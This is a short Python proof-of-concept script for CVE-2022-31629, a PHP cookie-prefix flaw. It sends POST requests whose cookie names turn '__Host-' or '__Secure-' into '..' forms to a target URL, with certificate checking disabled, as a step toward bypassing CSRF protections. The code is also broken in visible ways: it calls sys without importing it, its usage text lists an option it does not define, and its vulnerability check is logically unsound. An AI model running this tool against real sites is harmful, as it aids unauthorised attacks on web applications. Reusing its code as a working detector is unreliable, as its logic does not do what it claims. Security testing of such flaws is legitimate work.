# php < 7.4.31
# php 8.0.0 and < 8.0.24
# php 8.1.0 and < 8.1.11

# Regex:
# ^5\.(\d+)\.(\d+)$|^7\.(0|[1-3])\.(\d+)$|^7\.4\.(0|[1-9]|1[0-9]|2[0-9]|30)$|^8\.(0)\.(0|[1-9]|1[0-9]|2[0-3])$|^8\.(1)\.(0|[1-9]|10)$

# __Host-/__Secure- cookie manipulation leads to CSRF bypass

import requests
import argparse


parser = argparse.ArgumentParser(usage="""CVE-2022-31629.py -u https://*.*.*.*/ -m y""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--custom', '-c', help='Input __Host- / __Secure- custom header', required=False)
args = parser.parse_args()


try:
    if args.custom:
        malicious_cookie = input("\nPut your __Host- or __Secure- you want to change: ")
        
        changed_cookie = malicious_cookie.replace("__", "..") 
        
        cookie = {'Cookie' : f'{changed_cookie}'}
        print(f"\n[+] Changing.... [{malicious_cookie}] => [{changed_cookie}]")
        print("[+] Sending request with changed cookie......\n")
        
        response = requests.post(args.URL, headers=cookie, verify=False)
        if malicious_cookie in response.headers:
            print("[+] Detected Vulnerability : True\n")

        else:
            print("[?] Maybe it is not vulnerable?!\n")
        
    else:
        malicious_cookies = ["__Host-x=y", "__Secure-x=y"]
        
        for default_cookie in malicious_cookies:            
            changed_cookie = default_cookie.replace("__", "..") 
            
            cookie = {'Cookie' : f'{changed_cookie}'}
            print(f"\n[O] Default cookie: {default_cookie}")
            print(f"[+] Changing.... [{default_cookie}] => [{changed_cookie}]")
            print("[+] Sending request with changed cookie......\n")
            
            response = requests.post(args.URL, headers=cookie, verify=False)
            if default_cookie in response.headers:
                print("[+] Detected Vulnerability : True\n")
                
            else:
                print("[-] Maybe it is not vulnerable?!\n")
                print("-"*100)            

except requests.RequestException:
    print("(!) Error occured in progress")
    sys.exit()